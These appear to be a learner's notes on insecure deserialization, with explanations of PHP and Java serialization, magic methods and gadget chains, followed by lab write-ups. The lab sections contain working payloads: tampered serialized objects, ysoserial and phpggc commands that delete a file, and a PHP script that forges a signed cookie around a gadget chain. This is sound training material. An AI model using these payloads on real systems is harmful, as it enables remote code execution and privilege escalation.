


# Serialization

process of converting complex data structure  into flatter format that can be sent and received as sequential stream of byte 


# Deserialization

process of restoring the byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.





how the object is serialized depends on the language.  some objects are serialized into binary formats noting that all of the original objects attributes are stored in the serialized data stream including private fields  to provent a field from being serielized it must be marked as transient 




# Insecure 


Insecure deserialization is when user controllable data is deserialized by a website. trhat enable an attacker to manipulate serialized objects in order to pass harmful data into the app 

user input should never be deserialized  

even checks on the deserialzed data is not valid since checking the data after it has been deserialized is flawed  too late


its made possiblee  due to the number of dependencies that exist  in modern websites 

that kind of attack provides an entry point to a massevly increased attack surface.  that allows an attacker to reuse existing application code in a malicious way  often remote code execution 


# Identify

check at all datqa being passed into the website and try to identify anything that looks like serialized data 


# Format 

`$user->name = "carlos"; $user->isLoggedIn = true;`

When serialized, this object may look something like this:

`O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`

- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
- `b:1` - The value of the second attribute is the boolean value `true`

there are native methods for PHP are serialize and unserialize 

this is a format for PHP for example Java  is more difficult to read but still we can identify serialized data, we can identify java by checking objects that always begin with the same bytes,  which are encoded as `ac ed` in hex and `ro0` in base64  basically any class  that implements ``java.io.Serializable`` 



# Manipulating

there are 2  approaches wen can take when manipulating serialized objects
- edit object directly in its byte form 
- write a script in the corresponding language to create and serialize the new object



when tampering with the data as long as the attacker preserves a valid serialized object, the deserialization process will create a server side object with the modified attribute value 


example:
``O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}``

turn the boolean value to 1   if the source code is this 

````
$user = unserialize($_COOKIE); if ($user->isAdmin === true) { // allow access to admin interface }
````
we have admin priv 


## Modifying data types

- check some flaws in the programming language used 
- in PHP logic if you perform a loose comparison  between int and string  PHP attempts to convert string to int  this works for any alphanumeric string that starts with a number PHP will effectively conver the entire string to an integer valye based on the initial number 
-  ``0 == "Example string" // true`` 0 numerals in the string.
- Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.


## Magic Method

methods that you do not invoke. they are invoked automatically whenever a particular event or scenario occurs one of the most common examples in PHP `__contstruct()` is invoked whenever an object of the class is instantiated. some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.

`readObject()` method declared in exactly this way acts as a magic method that is invoked during deserialization.


**These methods are always prefixed with double underscores (`__`)**



### Gadget Chain 


gadget that can be used to simply be to invoke a method that will pass their input into another gadget  by chaining them together that could turn into `sink gadget`

what does that mean its basically a chain of code that already exist that we can invoke the magic method so what we can do something malicious 

frankly this can be possible with the source code  but we can always find a way to work with pre-build gadgets  they provide range of pre-discovered chains that have been successfully exploited on other websites 

`ysoserial`  tool for java deserialization,  that lets us use gadget chains for        a lib that you think the target application is using 


# Lab: Modifying serialized objects


in the cookie we found a base64 encoded   changed 0 to 1

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`



# Lab: Modifying serialized data types
i is for INT and doest take size
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```



# Lab: Using application functionality to exploit insecure deserialization

```
O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"v3c31ff3r6q9r6cp2q8z50w8nmdgiani";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```



# Lab: Arbitrary object injection in PHP


tilde ~ to the file name shows you the source code
GET /libs/CustomTemplate.php~  

`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`



# Lab: Exploiting Java deserialization with Apache Commons


`java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 `

then used sublime to basically url encode it 


when i used another common collection i had a result of java class not found 


# Lab: Exploiting PHP deserialization with a pre-built gadget chain



```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "6vwbatmap7szvb6kbbdbqgmzlchytkkq";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

secret key was in the php info page which was commented in the code

``./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64``